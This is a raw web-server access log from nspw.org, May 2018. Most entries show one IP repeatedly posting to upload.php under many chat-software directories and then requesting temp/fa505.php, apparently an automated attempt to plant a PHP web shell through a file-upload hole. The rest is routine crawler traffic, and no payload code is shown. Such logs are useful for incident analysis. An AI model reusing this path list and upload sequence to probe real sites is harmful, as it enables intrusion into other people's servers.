www.nspw.org:80 54.36.149.9 - - [02/May/2018:19:35:08 -0400] "GET /2008/panel.htmlQQ HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:35:13 -0400] "POST /shbt/upload.php HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:35:14 -0400] "GET /shbt/temp/fa505.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:19:35:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:35:37 -0400] "POST /haces/upload.php HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:35:45 -0400] "GET /haces/temp/fa505.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 207.46.13.1 - - [02/May/2018:19:35:48 -0400] "GET /papers/2009/nspw2009-peisert.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:35:57 -0400] "POST /chat-bebica/upload.php HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:35:58 -0400] "GET /chat-bebica/temp/fa505.php HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:36:25 -0400] "POST /smf/chat/upload.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:36:32 -0400] "GET /smf/chat/temp/fa505.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:36:37 -0400] "POST /FlashChat_v608/chat/upload.php HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:36:46 -0400] "GET /FlashChat_v608/chat/temp/fa505.php HTTP/1.1" 302 541 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:37:01 -0400] "POST /public/chat/upload.php HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:37:08 -0400] "GET /public/chat/temp/fa505.php HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:37:16 -0400] "POST /foro/chat/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
